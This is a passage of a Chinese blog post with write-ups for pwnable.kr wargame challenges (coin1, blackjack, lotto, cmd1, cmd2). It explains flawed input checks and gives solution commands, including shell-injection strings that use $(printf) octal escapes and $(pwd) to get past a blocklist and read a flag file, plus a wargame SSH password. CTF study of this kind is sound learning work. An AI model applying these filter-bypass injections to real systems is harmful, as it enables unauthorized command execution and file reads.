<!DOCTYPE html><html lang="zh-CN" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="pwnable.kr刷题[Toddler’s Bottle(16/21)]" /><meta property="og:locale" content="zh_CN" /><meta name="description" content="coin1" /><meta property="og:description" content="coin1" /><link rel="canonical" href="https://fengf3ng.github.io/posts/pwnable.kr%E5%88%B7%E9%A2%982/" /><meta property="og:url" content="https://fengf3ng.github.io/posts/pwnable.kr%E5%88%B7%E9%A2%982/" /><meta property="og:site_name" content="fengF3ng’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-30T10:10:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="pwnable.kr刷题[Toddler’s Bottle(16/21)]" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-30T10:10:00+08:00","datePublished":"2022-08-30T10:10:00+08:00","description":"coin1","headline":"pwnable.kr刷题[Toddler’s Bottle(16/21)]","mainEntityOfPage":{"@type":"WebPage","@id":"https://fengf3ng.github.io/posts/pwnable.kr%E5%88%B7%E9%A2%982/"},"url":"https://fengf3ng.github.io/posts/pwnable.kr%E5%88%B7%E9%A2%982/"}</script><title>pwnable.kr刷题[Toddler's Bottle(16/21)] | fengF3ng's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="fengF3ng's Blog"><meta name="application-name" content="fengF3ng's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/sidebar/nanachi.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">fengF3ng's Blog</a></div><div class="site-subtitle font-italic">专注个人笔记</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>首页</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>分类</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>标签</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>归档</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>关于</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/fengF3ng" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['hefeng.hf','foxmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> 首页 </a> </span> <span>pwnable.kr刷题[Toddler's Bottle(16/21)]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> 文章</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="搜索..."> </span> <span id="search-cancel" >取消</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>pwnable.kr刷题[Toddler's Bottle(16/21)]</h1><div class="post-meta text-muted"> <span> 发表于 <em class="" data-ts="1661825400" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-08-30 </em> </span><div class="d-flex justify-content-between"> <span> 作者 <em> <a href="https://github.com/fengF3ng">fengF3ng</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2356 字"> <em>13 分钟</em>阅读</span></div></div></div><div class="post-content"><h1 id="coin1">coin1</h1><p>简单的二分法，学习一下正则表达式，以后可以更好处理这种格式化输入的情况。</p><p>远程连接延迟较高，上传到本地后执行</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">root@HeFeng:~/pwn-workplace#</span><span class="w"> </span>scp <span class="nt">-P</span> 2222 ./hack.py horcruxes@pwnable.kr:/tmp
<span class="go">horcruxes@pwnable.kr's password:
hack.py                                                                               100%  700     3.0KB/s   00:00
</span></pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">9007</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"- Ready? starting in 3 sec... -</span><span class="se">\n\t\n</span><span class="s">"</span><span class="p">)</span>

<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">N</span><span class="p">,</span> <span class="n">C</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d+"</span><span class="p">,</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">)))</span>
        <span class="n">left</span><span class="p">,</span> <span class="n">right</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">C</span><span class="p">):</span>
            <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">" "</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="n">mid</span><span class="p">)]))</span>
            <span class="nb">sum</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
            <span class="k">if</span> <span class="nb">sum</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">left</span> <span class="o">=</span> <span class="n">mid</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">right</span> <span class="o">=</span> <span class="n">mid</span>
        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">left</span><span class="p">))</span>
        <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"error"</span><span class="p">)</span>
        <span class="k">break</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
</pre></table></code></div></div><h1 id="blackjack">blackjack</h1><p>betting对赌注的判定不严谨，一方面第二次判断的时候没有和cash比较，另一方面没有过滤负数。</p><p>直接用-1000000做赌注输掉即可</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">betting</span><span class="p">()</span> <span class="c1">//Asks user amount to bet</span>
<span class="p">{</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Enter Bet: $"</span><span class="p">);</span>
 <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="n">bet</span> <span class="o">&gt;</span> <span class="n">cash</span><span class="p">)</span> <span class="c1">//If player tries to bet more money than player has</span>
 <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">You cannot bet more money than you have."</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Bet: "</span><span class="p">);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bet</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="k">return</span> <span class="n">bet</span><span class="p">;</span>
<span class="p">}</span> <span class="c1">// End Function</span>
</pre></table></code></div></div><h1 id="lotto">lotto</h1><p>嵌套的for循环比较会大幅提高命中率，我们输入6个一样的字符，只需要猜中任何一位即可，这个概率约为1-(44/45)^6。</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">submit</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">play</span><span class="p">(){</span>

        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Submit your 6 lotto bytes : "</span><span class="p">);</span>
        <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Lotto Start!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="c1">//sleep(1);</span>

        <span class="c1">// generate lotto numbers</span>
        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"error. tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">lotto</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
        <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">lotto</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">6</span><span class="p">){</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"error2. tell admin</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="mi">45</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>         <span class="c1">// 1 ~ 45</span>
        <span class="p">}</span>
        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

        <span class="c1">// calculate lotto score</span>
        <span class="kt">int</span> <span class="n">match</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="k">for</span><span class="p">(</span><span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">){</span>
                        <span class="k">if</span><span class="p">(</span><span class="n">lotto</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">submit</span><span class="p">[</span><span class="n">j</span><span class="p">]){</span>
                                <span class="n">match</span><span class="o">++</span><span class="p">;</span>
                        <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">// win!</span>
        <span class="k">if</span><span class="p">(</span><span class="n">match</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"bad luck...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="p">}</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">help</span><span class="p">(){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"- nLotto Rule -</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"nlotto is consisted with 6 random natural numbers less than 46</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"your goal is to match lotto numbers as many as you can</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"if you win lottery for *1st place*, you will get reward</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"for more details, follow the link below</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"mathematical chance to win this game is known to be 1/8145060.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>

        <span class="c1">// menu</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">menu</span><span class="p">;</span>

        <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>

                <span class="n">printf</span><span class="p">(</span><span class="s">"- Select Menu -</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"1. Play Lotto</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"2. Help</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"3. Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

                <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">menu</span><span class="p">);</span>

                <span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">){</span>
                        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">play</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
                                <span class="n">help</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                                <span class="n">printf</span><span class="p">(</span><span class="s">"bye</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="nl">default:</span>
                                <span class="n">printf</span><span class="p">(</span><span class="s">"invalid menu</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                                <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h1 id="cmd1">cmd1</h1><p>过滤规则不完善，<code class="language-plaintext highlighter-rouge">./cmd1 "/bin/cat /home/cmd1/*"</code>即可。</p><p>参考了网上的答案<code class="language-plaintext highlighter-rouge">./cmd1 "/bin/cat /home/cmd1/f*"</code>更高效。</p><p>这题也可以先写一个脚本，然后利用cmd1去执行。要注意的是/tmp目录下可以写入新文件，~/cmd1目录不允许新建文件。</p><p>除此之外这题也学习了putenv函数，由于修改了PATH=/thankyouverymuch，所以直接使用cat命令会显示找不到。</p><p>根据生命周期分可分为永久性和临时性。永久的需要修改相关配置文件，变量永久生效；临时的是用户利用export命令，在当前终端下声明环境变量，关闭shell终端，则变量失效。</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"flag"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"tmp"</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">"PATH=/thankyouverymuch"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">“”(双引)：”$</span>”,”<span class="sb">`</span>”,”<span class="se">\”</span>都按特殊字符解析，不按字母意思解析，”<span class="se">\$</span>vlocal”指的是变量值
<span class="go">”(单引)字符解析，没有特殊含义
</span><span class="gp">“(反引)内容解析为系统命令；同$</span><span class="o">()</span>
<span class="go">\(反斜)屏蔽下一个字符的特殊含义
</span><span class="gp">$</span>:传递到脚本中的参数个数
<span class="go">?:0个或1个在其之前的那个普通字符
*:0个或多个之前的那个普通字符
+:1个或多个之前的那个普通字符
^:行首
</span><span class="gp">$</span>:命令退出状态，0无，非0有
<span class="go">|:管道；或
</span></pre></table></code></div></div><h1 id="cmd2">cmd2</h1><p>ssh连接密码：mommy now I get what PATH environment is for :)</p><p>过滤规则更严，可以考虑用ascii代替/。直接使用<code class="language-plaintext highlighter-rouge">./cmd2 '\\057bin\\057cat fl""ag'</code>无法在system运行时转换成/</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">cmd2@pwnable:~$</span><span class="w"> </span>./cmd2 <span class="s1">'$(printf \\057bin\\057cat) fl""ag'</span>
<span class="gp">$</span><span class="o">(</span><span class="nb">printf</span> <span class="se">\\</span>057bin<span class="se">\\</span>057cat<span class="o">)</span> fl<span class="s2">""</span>ag
<span class="go">FuN_w1th_5h3ll_v4riabl3s_haha
</span></pre></table></code></div></div><p>看到了执行脚本的另一种绕过方法，当前目录切换到/的时侯$(pwd)就是/</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">/home/cmd2/cmd2 '$</span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>tmp<span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>p4nda<span class="s1">'
</span></pre></table></code></div></div><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
